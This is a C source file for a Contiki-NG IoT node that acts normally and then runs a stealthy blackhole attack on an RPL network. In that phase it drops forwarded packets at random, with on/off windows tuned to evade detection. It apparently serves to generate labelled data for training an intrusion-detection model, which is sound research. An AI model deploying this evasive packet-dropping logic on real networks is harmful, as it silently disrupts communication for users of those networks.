#include "contiki.h"
#include "net/app-layer/attack-analyzer/attacker-analyzer.h"
#include "net/ipv6/simple-udp.h"
#include "net/ipv6/uip-ds6-route.h"
#include "net/mac/4emac/4emac-private.h"
#include "net/netstack.h"
#include "net/routing/routing.h"
#include "net/routing/rpl-classic/rpl-dag-root.h"
#include "net/routing/rpl-classic/rpl-private.h"
#include "net/routing/rpl-classic/rpl.h"
#include "random.h"

#include "sys/log.h"
#define LOG_MODULE "BlackholeAttack"
#define LOG_LEVEL LOG_LEVEL_INFO

/* Normal mode settings */
#define UDP_CLIENT_PORT 8765
#define UDP_SERVER_PORT 5678
#define NORMAL_SEND_INTERVAL (15 * CLOCK_SECOND)
#define JRC_IP_ADDR                                                            \
  {0xfd, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                             \
   0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05}
static uip_ipaddr_t jrc_ip_addr;
static struct simple_udp_connection udp_conn;

/*
 * Phase transition: 3 min warm-up (unlabelled in attacker-analyzer) +
 * 2 min DODAG join phase. After this time attack mode is enabled; the
 * attacker-analyzer labels switch to 1 / ATTACK_TYPE_BLACKHOLE.
 */
#define ATTACK_DELAY_MIN (20 * 60 * CLOCK_SECOND)  // 60-min run; attack start random in [20,25] min
#define ATTACK_DELAY_MAX (25 * 60 * CLOCK_SECOND)

/*
 * Stealth knobs: to avoid producing a trivially classifiable dataset.
 * - DROP_PROB_PERCENT: probability (percent) of dropping a route on each
 *   drop tick. 100 = classic aggressive; <100 thins out the drop sequence.
 * - Drop interval is random in [DROP_INTERVAL_MIN, DROP_INTERVAL_MAX) seconds
 *   instead of a fixed 12s -> helps break timestamp-based pattern formation
 *   in the route_count and dis_sent features.
 * - On/off windows: the attacker cycles between active and passive periods;
 *   in a passive window the label stays 1 but no route is dropped.
 */
#ifndef BLACKHOLE_DROP_PROB_PERCENT
#define BLACKHOLE_DROP_PROB_PERCENT 60
#endif
#ifndef BLACKHOLE_DROP_INTERVAL_MIN_S
#define BLACKHOLE_DROP_INTERVAL_MIN_S 10
#endif
#ifndef BLACKHOLE_DROP_INTERVAL_MAX_S
#define BLACKHOLE_DROP_INTERVAL_MAX_S 20
#endif
#ifndef BLACKHOLE_ACTIVE_WINDOW_MIN_S
#define BLACKHOLE_ACTIVE_WINDOW_MIN_S 60
#endif
#ifndef BLACKHOLE_ACTIVE_WINDOW_MAX_S
#define BLACKHOLE_ACTIVE_WINDOW_MAX_S 120
#endif
#ifndef BLACKHOLE_PASSIVE_WINDOW_MIN_S
#define BLACKHOLE_PASSIVE_WINDOW_MIN_S 60
#endif
#ifndef BLACKHOLE_PASSIVE_WINDOW_MAX_S
#define BLACKHOLE_PASSIVE_WINDOW_MAX_S 180
#endif

static clock_time_t
random_interval_seconds(unsigned int min_s, unsigned int max_s)
{
  unsigned int span = (max_s > min_s) ? (max_s - min_s) : 0;
  unsigned int off = (span > 0) ? (random_rand() % span) : 0;
  return (clock_time_t)(min_s + off) * CLOCK_SECOND;
}

static uip_ipaddr_t parent_ip_addr;
static bool parent_ip_known = false;

/*---------------------------------------------------------------------------*/
PROCESS(blackhole_attack_process, "Blackhole Attack Client");
AUTOSTART_PROCESSES(&blackhole_attack_process);
/*---------------------------------------------------------------------------*/
static void udp_rx_callback(struct simple_udp_connection *c,
                            const uip_ipaddr_t *sender_addr,
                            uint16_t sender_port,
                            const uip_ipaddr_t *receiver_addr,
                            uint16_t receiver_port, const uint8_t *data,
                            uint16_t datalen) {
  /* In normal mode, we might receive packets. In attack mode, we ignore them.
   */
  LOG_INFO("Received UDP packet, ignoring.\n");
}
/*---------------------------------------------------------------------------*/
PROCESS_THREAD(blackhole_attack_process, ev, data) {
  static struct etimer periodic_timer;
  static struct etimer attack_delay_timer;
  static unsigned count = 0;
  uip_ipaddr_t dest_ipaddr;

  PROCESS_BEGIN();

  /* --- Initialization for normal operation --- */
  uint8_t jrc_addr[16] = JRC_IP_ADDR;
  memcpy(jrc_ip_addr.u8, jrc_addr, 16);
  simple_udp_register(&udp_conn, UDP_CLIENT_PORT, NULL, UDP_SERVER_PORT,
                      udp_rx_callback);
  foure_timesynch_init(0);
  /* Initialize analyzer with normal mode (is_attacker=0,
   * attack_type=ATTACK_TYPE_NONE) */
  attacker_analyzer_init(0, &udp_conn, (void *)&jrc_ip_addr,
                         (unsigned short)UDP_SERVER_PORT, 0, ATTACK_TYPE_NONE);

  LOG_INFO("Node starting in normal mode. Blackhole attack will begin in 3 "
           "minutes.\n");
  clock_time_t attack_delay = ATTACK_DELAY_MIN + (random_rand() % (ATTACK_DELAY_MAX - ATTACK_DELAY_MIN));
  LOG_INFO("Attack delay drawn: %lu sec (uniform [20,25] min)\n", (unsigned long)(attack_delay / CLOCK_SECOND));
  etimer_set(&attack_delay_timer, attack_delay);
  etimer_set(&periodic_timer, random_rand() % NORMAL_SEND_INTERVAL);

  /* --- Normal Phase Loop --- */
  while (!etimer_expired(&attack_delay_timer)) {
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&periodic_timer));

    if (etimer_expired(&attack_delay_timer)) {
      break;
    }

    if (NETSTACK_ROUTING.node_is_reachable() &&
        NETSTACK_ROUTING.get_root_ipaddr(&dest_ipaddr)) {
      LOG_INFO("Sending normal UDP packet %u to ", count);
      LOG_INFO_6ADDR(&dest_ipaddr);
      LOG_INFO_("\n");
      {
        uint32_t packed = attacker_pack_app_pkt((uint32_t)count);
        simple_udp_sendto(&udp_conn, &packed, sizeof(packed), &dest_ipaddr);
      }
      count++;
      /* Update packet count for analyzer */
      attacker_analyzer_set_app_packet_count(count);
    } else {
      LOG_INFO("Normal mode: Not reachable yet\n");
    }
    etimer_set(&periodic_timer, NORMAL_SEND_INTERVAL - CLOCK_SECOND +
                                    (random_rand() % (2 * CLOCK_SECOND)));
  }

  /* --- Activate Attack Phase: STEALTHY BLACKHOLE --- */
  LOG_INFO("ATTACK PHASE: Becoming a stealthy selective blackhole.\n");
  attacker_analyzer_set_attack_mode(1, ATTACK_TYPE_BLACKHOLE);

  rpl_dag_t *dag = rpl_get_any_dag();
  if (dag && dag->preferred_parent) {
    const uip_ipaddr_t *parent_ip =
        rpl_parent_get_ipaddr(dag->preferred_parent);
    LOG_INFO("Stealthy blackhole acting. Parent: ");
    LOG_INFO_6ADDR(parent_ip);
    LOG_INFO_("\n");
    uip_ipaddr_copy(&parent_ip_addr, parent_ip);
    parent_ip_known = true;
  }

  LOG_INFO("Real blackhole active: silent forwarding drops via uip6 hook (probabilistic, on/off windows).\n");

  /*
   * v5 behaviour: real blackhole.
   * The previous version (v2-v4) removed the child entry from the routing
   * table via uip_ds6_route_rm() - the victim would refresh its DAO and
   * rebuild the route, and the attacker left no anomaly in its own telemetry
   * (delta_tx attacker=1638 vs normal=1351, i.e. an inverted, higher value).
   *
   * v5 approach: the blackhole_drop_forwards flag is checked in the uip6.c
   * forwarding decision. When flag=1 during an active window, packets that
   * should be forwarded (not the node's own packets) are silently dropped
   * with probability BLACKHOLE_DROP_PROB_PERCENT percent. Telemetry effect:
   *   - tx_slot_count, delta_tx DROP at the attacker (nothing is forwarded)
   *   - route_count stays high (routes are not removed, just not used)
   *   - the "high route_count + low delta_tx" anomalous combination provides
   *     a clear signature for the ML model.
   */
  blackhole_drop_prob_percent = BLACKHOLE_DROP_PROB_PERCENT;

  static struct etimer window_toggle_timer;
  static uint8_t attack_window_active = 1;

  /* Start in an active window - forwarding drop hook is on */
  blackhole_drop_forwards = 1;
  etimer_set(&window_toggle_timer,
             random_interval_seconds(BLACKHOLE_ACTIVE_WINDOW_MIN_S,
                                     BLACKHOLE_ACTIVE_WINDOW_MAX_S));
  etimer_set(&periodic_timer, NORMAL_SEND_INTERVAL);

  while (1) {
    PROCESS_WAIT_EVENT();

    if (ev == PROCESS_EVENT_TIMER && data == &window_toggle_timer) {
      attack_window_active = !attack_window_active;
      if (attack_window_active) {
        blackhole_drop_forwards = 1;
        LOG_INFO("Blackhole: entering ACTIVE window (forwarding drop ON).\n");
        etimer_set(&window_toggle_timer,
                   random_interval_seconds(BLACKHOLE_ACTIVE_WINDOW_MIN_S,
                                           BLACKHOLE_ACTIVE_WINDOW_MAX_S));
      } else {
        blackhole_drop_forwards = 0;
        LOG_INFO("Blackhole: entering PASSIVE window (forwarding normal).\n");
        etimer_set(&window_toggle_timer,
                   random_interval_seconds(BLACKHOLE_PASSIVE_WINDOW_MIN_S,
                                           BLACKHOLE_PASSIVE_WINDOW_MAX_S));
      }
    }

    if (ev == PROCESS_EVENT_TIMER && data == &periodic_timer) {
      if (NETSTACK_ROUTING.node_is_reachable() &&
          NETSTACK_ROUTING.get_root_ipaddr(&dest_ipaddr)) {
        LOG_INFO("Blackhole: Sending telemetry packet %u\n", count);
        {
          uint32_t packed = attacker_pack_app_pkt((uint32_t)count);
          simple_udp_sendto(&udp_conn, &packed, sizeof(packed), &dest_ipaddr);
        }
        count++;
        attacker_analyzer_set_app_packet_count(count);
      } else {
        LOG_INFO("Blackhole mode: Not reachable yet\n");
      }

      etimer_set(&periodic_timer, NORMAL_SEND_INTERVAL - CLOCK_SECOND +
                                      (random_rand() % (2 * CLOCK_SECOND)));
    }
  }

  PROCESS_END();
}
/*---------------------------------------------------------------------------*/